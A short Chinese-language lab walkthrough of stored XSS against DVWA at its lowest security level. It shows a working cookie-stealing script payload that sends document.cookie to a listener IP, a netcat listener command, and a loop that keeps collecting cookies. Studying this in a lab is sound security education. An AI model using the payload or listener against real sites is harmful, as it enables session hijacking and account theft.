## 一、存储型XSS(Stored XSS)
存储型XSS的Payload会被永久保存在网站的数据库中（如一条留言、一篇帖子），访问即中招。
## 二、攻击流程
### 2.1侦测漏洞
1. DVWA Security级别low
2. XSS(Stored)模块，输入测试代码`<script>alert('Stored XSS')</script>`
3. 弹出"Stored XSS"警告框，且每次都弹窗，证明脚本保存在服务器上
### 2.2准备Payload
1. 目标是窃取Cookie
2. 修改message的text限制为500；`<textarea name="mtxMessage" cols="50" rows="3" maxlength="500"></textarea>`
3. Payload；`<script>document.location='http://192.168.174.129:1234/?cookie=' + document.cookie;</script>`
### 2.3收获
1. 启动监听器；`nc -lvp 1234`
2. XSS(Stored)提交Payload
3. `netcat`接收到Cookie
## 三、总结
1. -l是listen，-v是verbose，-p是port
2. `while true; do nc -lvp 1234; done`则不断接收Cookie
3. 不重置数据库，又能安全返回XSS Stored页面的方法：浏览器暂时禁用JavaScript功能
    - 浏览器地址栏输入`about:config`
    - 搜索`javascript.enabled`，将其从`true`切换成`false`

